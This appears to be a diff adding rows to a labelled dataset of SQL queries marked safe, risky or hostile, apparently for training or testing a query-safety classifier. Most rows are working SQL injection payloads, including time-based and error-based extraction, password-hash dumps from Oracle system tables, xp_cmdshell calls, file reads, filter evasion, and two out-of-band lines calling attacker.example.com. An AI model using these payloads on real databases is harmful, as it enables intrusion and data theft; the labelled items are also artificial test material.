+1365,write_bounded,safe,"INSERT INTO sessions (status, amount) VALUES ('active', 100.00)"
+1366,sl_time_blind,hostile,"SELECT id, username FROM users WHERE username = 'benchmark(10000000,MD5(1))#"
+1367,write_bounded,safe,UPDATE orders SET updated_at = '2026-08-20' WHERE id = 1
+1368,sl_time_blind,hostile,"SELECT id, code FROM sessions WHERE code = '' or pg_sleep(5)--"
+1369,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1 OR 3271=(SELECT 3271 FROM PG_SLEEP(5))
+1370,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = 'where id=.1union/*.1*/select-.1"
+1371,oob_rce,hostile,COPY (SELECT '') TO PROGRAM 'curl attacker.example.com'
+1372,sl_time_blind,hostile,"SELECT id, title FROM accounts WHERE title = '(SELECT (CASE WHEN (3271=3271) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),500000000),NULL) ELSE ''qxjkp'' END) FROM (VALUES(0)))"
+1373,sl_generic,hostile,SELECT * FROM accounts WHERE id = -- &password=
+1374,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or 0=0 --
+1375,sl_generic,hostile,"SELECT id, title FROM products WHERE title = 'x' OR full_name LIKE '%Bob%"
+1376,schema_change,risky,ALTER TABLE sessions DROP COLUMN updated_at
+1377,read_simple,safe,"SELECT amount, name FROM users WHERE updated_at >= '2026-08-20' LIMIT 50"
+1378,read_simple,safe,"SELECT user_id, title FROM carts WHERE status = 'refunded' LIMIT 20"
+1379,read_simple,safe,"SELECT amount, title FROM reviews WHERE title = 'VIP Upgrade' LIMIT 50"
+1380,sl_auth_bypass,hostile,"SELECT id, code FROM sessions WHERE code = 'root' or 1=1--"
+1381,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 ,RAISE_ERROR('70001','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'qpbxq')"
+1382,sl_error_based,hostile,SELECT * FROM users WHERE id = 1 ;DECLARE @'qxjkp' NVARCHAR(4000);SET @'qxjkp'=(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq');EXEC @'qxjkp'
+1383,sl_oracle,hostile,"SELECT id, email FROM users WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i"
+1384,legit_lookalike,safe,SELECT * FROM products WHERE description LIKE '%union jack%'
+1385,unbounded_write,risky,UPDATE coupons SET status = 'paid'
+1386,sl_generic,hostile,"SELECT id, username FROM accounts WHERE username = '"" or 0=0 --"
+1387,sl_generic,hostile,"SELECT id, code FROM members WHERE code = '*(|(objectclass=*))"
+1388,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR 3271=(SELECT ms_trunc(CAST('qjvkq'||CAST((SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END) AS VARCHAR)||'qpbxq' AS DECIMAL),1))"
+1389,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM reviews a JOIN refunds b ON b.user_id = a.id WHERE a.email = 'bob@shop.io' GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+1390,sl_inline_query,hostile,"SELECT id, email FROM users WHERE email = '(SELECT 'qjvkq'+(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)+'qpbxq')"
+1391,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM payments a JOIN shops b ON b.shop_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+1392,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = 'Q=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(112)||CHR(106)||CHR(113)||NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--"
+1393,read_simple,safe,"SELECT name, updated_at FROM users WHERE amount = 100.00 LIMIT 100"
+1394,admin_op,risky,GRANT ALL PRIVILEGES ON orders.* TO 'readonly'@'%'
+1395,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM coupons a JOIN shops b ON b.user_id = a.id WHERE a.user_id = 88 GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+1396,write_bounded,safe,UPDATE payments SET status = 'paid' WHERE id = 100
+1397,sl_time_blind,hostile,"SELECT id, email FROM accounts WHERE email = ',(SELECT (CASE WHEN (3271=3271) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) ELSE 1/(SELECT 0) END))"
+1398,json_legit,safe,SELECT data->>'$.name' FROM profiles WHERE user_id = 42
+1399,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055"
+1400,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = '' and substr(data,1,1) = unhex(61)# unhex(6162)"
+1401,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))s), 8446744073709551610, 8446744073709551610)))"
+1402,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = 'rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'"
+1403,sl_boolean_blind,hostile,"SELECT id, email FROM accounts WHERE email = '(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+1404,sl_mssql,hostile,"SELECT id, title FROM users WHERE title = ''exec sp_addlogin 'name' , 'password' --"
+1405,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 OR EXTRACTVALUE(3271,CONCAT('\','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'))"
+1406,admin_op,risky,REVOKE UPDATE ON products FROM 'etl'@'%'
+1407,admin_op,risky,REVOKE DELETE ON coupons FROM 'migration'@'%'
+1408,sl_mssql,hostile,"SELECT id, title FROM products WHERE title = ''; exec master..xp_cmdshell 'ping 10.10.1.2'--"
+1409,sl_auth_bypass,hostile,"SELECT id, email FROM sessions WHERE email = 'updatexml(0,concat(0xa,user()),0)"
+1410,schema_change,risky,ALTER TABLE sessions DROP COLUMN created_at
+1411,sl_file_enum,hostile,"SELECT id, title FROM products WHERE title = 'create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'"" select * from myfile""--"
+1412,read_simple,safe,"SELECT status, created_at FROM users WHERE shop_id = 27 LIMIT 50"
+1413,admin_op,risky,SET GLOBAL max_connections = 0
+1414,sl_error_based,hostile,"SELECT id, username FROM accounts WHERE username = '(CONVERT(INT,(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq')))"
+1415,sl_error_based,hostile,"SELECT id, title FROM orders WHERE title = '(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq')"
+1416,waf_encoding,hostile,SELECT * FROM users WHERE name LIKE 'admin' AND pw LIKE 'x'
+1417,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 ;SELECT BENCHMARK(5000000,MD5(''qxjkp''))"
+1418,read_simple,safe,"SELECT title, name FROM coupons WHERE title = 'VIP Upgrade' LIMIT 50"
+1419,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 floor(pi()*pi()*floor(pi())) 29"
+1420,sl_file_enum,hostile,SELECT * FROM orders WHERE id = 1 select @@servernamee
+1421,sl_boolean_blind,hostile,SELECT * FROM orders WHERE id = 1 ;SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE 3271*(SELECT 3271 FROM INFORMATION_SCHEMA.PLUGINS) END)
+1422,waf_keyword,hostile,"SELECT * FROM news WHERE id = 1 UNunionION SEselectLECT 1,2,3"
+1423,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM carts a JOIN refunds b ON b.shop_id = a.id WHERE a.id = 100 GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+1424,sl_oracle,hostile,"SELECT id, title FROM products WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i"
+1425,sl_boolean_blind,hostile,"SELECT id, title FROM accounts WHERE title = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END))"
+1426,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = '' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--"
+1427,schema_change,risky,ALTER TABLE shops MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+1428,read_simple,safe,"SELECT updated_at, status FROM reviews WHERE created_at >= '2026-09-01' LIMIT 20"
+1429,sl_oracle,hostile,"SELECT id, email FROM products WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i"
+1430,read_simple,safe,"SELECT user_id, status FROM orders WHERE name = 'Daniel Ma' LIMIT 10"
+1431,read_simple,safe,"SELECT amount, user_id FROM shops WHERE user_id = 501 LIMIT 10"
+1432,sl_boolean_blind,hostile,"SELECT id, name FROM users WHERE name = '(CASE WHEN 3271=3271 THEN 1 ELSE NULL END)"
+1433,sl_boolean_blind,hostile,"SELECT id, title FROM members WHERE title = '(CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 FROM DUAL UNION SELECT 4471 FROM DUAL) END)"
+1434,admin_op,risky,REVOKE INSERT ON refunds FROM 'readonly'@'%'
+1435,schema_change,risky,ALTER TABLE coupons MODIFY COLUMN status VARCHAR(32) NOT NULL
+1436,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 AND 3271=(SELECT 3271 FROM PG_SLEEP(5))
+1437,sl_time_blind,hostile,SELECT * FROM users WHERE (code = 'x'') or pg_sleep(5)--
+1438,sl_generic,hostile,SELECT * FROM users WHERE id = 1 and 1 in (select var from temp)--
+1439,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 declare @q nvarchar (200) 0x730065006c00650063 ...
+1440,schema_change,risky,ALTER TABLE payments DROP COLUMN name
+1441,sl_file_enum,hostile,"SELECT id, email FROM orders WHERE email = 'create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;"
+1442,sl_error_based,hostile,"SELECT * FROM sessions WHERE id = 1 AND 3271=TO_POSIXTIME(TO_DATE('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq','YYYY'))"
+1443,schema_change,risky,ALTER TABLE refunds DROP COLUMN id
+1444,sl_generic,hostile,"SELECT id, code FROM members WHERE code = 'a' or 1=1--"
+1445,sl_time_blind,hostile,"SELECT * FROM accounts WHERE (title = 'x') or benchmark(10000000,MD5(1))#"
+1446,schema_change,risky,ALTER TABLE refunds MODIFY COLUMN name VARCHAR(32) NOT NULL
+1447,sl_generic,hostile,"SELECT id, name FROM users WHERE name = 'x' AND members.email IS NULL; --"
+1448,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)"
+1449,sl_generic,hostile,"SELECT id, title FROM members WHERE title = 'sqlvuln;"
+1450,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 AND 3271=BENCHMARK(5000000,MD5(''qxjkp''))"
+1451,schema_change,risky,ALTER TABLE sessions MODIFY COLUMN updated_at VARCHAR(32) NOT NULL
+1452,write_bounded,safe,DELETE FROM orders WHERE id = 2048 AND title = 'Free Shipping'
+1453,waf_comment,hostile,SELECT/*avoid-spaces*/password/**/FROM/**/members
+1454,read_simple,safe,"SELECT status, email FROM products WHERE created_at >= '2026-01-01' LIMIT 20"
+1455,write_bounded,safe,UPDATE coupons SET status = 'active' WHERE id = 100
+1456,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 OR (SELECT 3271 FROM (SELECT(SLEEP(5)))'qxjkp')
+1457,write_bounded,safe,UPDATE shops SET status = 'refunded' WHERE id = 9912
+1458,sl_stacked,hostile,"SELECT * FROM users WHERE id = 1 ;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5"
+1459,sl_union,hostile,SELECT * FROM users WHERE id = 1 union all select @@version--
+1460,sl_boolean_blind,hostile,"SELECT id, username FROM orders WHERE username = '(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END))"
+1461,sl_generic,hostile,"SELECT id, email FROM members WHERE email = '; exec xp_regread"
+1462,admin_op,risky,SET GLOBAL foreign_key_checks = 0
+1463,admin_op,risky,GRANT ALL PRIVILEGES ON coupons.* TO 'etl'@'%'
+1464,schema_change,risky,ALTER TABLE users DROP COLUMN user_id
+1465,sl_auth_bypass,hostile,"SELECT id, title FROM orders WHERE title = 'insert(insert(version(),1,0,space(0)),2,222,space(0))"
+1466,sl_oracle,hostile,"SELECT id, name FROM sessions WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i"
+1467,sl_generic,hostile,"SELECT id, email FROM users WHERE email = '%20or%20''='"
+1468,admin_op,risky,GRANT DELETE ON carts.* TO 'migration'@'%'
+1469,admin_op,risky,GRANT UPDATE ON payments.* TO 'app'@'%'
+1470,sl_time_blind,hostile,SELECT * FROM users WHERE (username = 'x'')) or pg_sleep(5)--
+1471,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM users a JOIN products b ON b.user_id = a.id WHERE a.status = 'active' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+1472,sl_generic,hostile,"SELECT id, username FROM products WHERE username = '' or 1=1"
+1473,sl_error_based,hostile,"SELECT id, name FROM users WHERE name = '(SELECT 3271 FROM(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
+1474,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+1475,sl_boolean_blind,hostile,"SELECT id, code FROM users WHERE code = '(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)"
+1476,second_order,hostile,UPDATE profile SET bio = ''; DROP TABLE sessions--' WHERE id = 1
+1477,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 AND ERROR(CONCAT('qjvkq',(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'qpbxq')) IS NOT NULL"
+1478,orm_inject,hostile,SELECT * FROM users WHERE id = 1 UNION SELECT password FROM users -- .raw()
+1479,read_simple,safe,"SELECT updated_at, amount FROM reviews WHERE name = 'Carol Wu' LIMIT 100"
+1480,sl_error_based,hostile,"SELECT id, email FROM products WHERE email = '(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))s), 8446744073709551610, 8446744073709551610)))"
+1481,sl_generic,hostile,SELECT * FROM products WHERE (name = 'x') or ('a'='a
+1482,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 OR 3271=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+1483,schema_change,risky,ALTER TABLE reviews DROP COLUMN shop_id
+1484,schema_change,risky,ALTER TABLE payments MODIFY COLUMN title VARCHAR(32) NOT NULL
+1485,sl_time_blind,hostile,"SELECT * FROM members WHERE id = 1 AND 3271=DBMS_PIPE.RECEIVE_MESSAGE(''qxjkp'',5)"
+1486,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM refunds a JOIN refunds b ON b.shop_id = a.id WHERE a.shop_id = 11 GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+1487,admin_op,risky,GRANT DELETE ON reviews.* TO 'etl'@'%'
+1488,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or 3=3
+1489,sl_time_blind,hostile,SELECT * FROM orders WHERE (email = 'x');waitfor delay '0:0:5'--
+1490,legit_risky,risky,TRUNCATE TABLE import_staging
+1491,write_bounded,safe,UPDATE sessions SET updated_at = '2025-12-31' WHERE id = 9912
+1492,sl_oracle,hostile,"SELECT id, code FROM sessions WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i"
+1493,admin_op,risky,GRANT ALL PRIVILEGES ON payments.* TO 'app'@'%'
+1494,oob_rce,hostile,"SELECT * FROM OPENROWSET('SQLOLEDB', 'attacker.example.com';'sa';'pwd', 'SELECT 1')"
+1495,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 1 select * from user where host ='localhost' || 1=1 limit 0,1;"
+1496,sl_generic,hostile,"SELECT id, title FROM sessions WHERE title = 'admin"") or ""1""=""1"
+1497,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = 'updatexml(1,concat('/',user()),1)"
+1498,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 waitfor delay '0:0:10'--
+1499,sl_boolean_blind,hostile,"SELECT * FROM sessions WHERE id = 1 OR MAKE_SET(3271=3271,4471)"
+1500,json_sqli,hostile,"SELECT * FROM t WHERE id=1 AND JSON_CONTAINS(data,'1','$.x') UNION SELECT token FROM users"
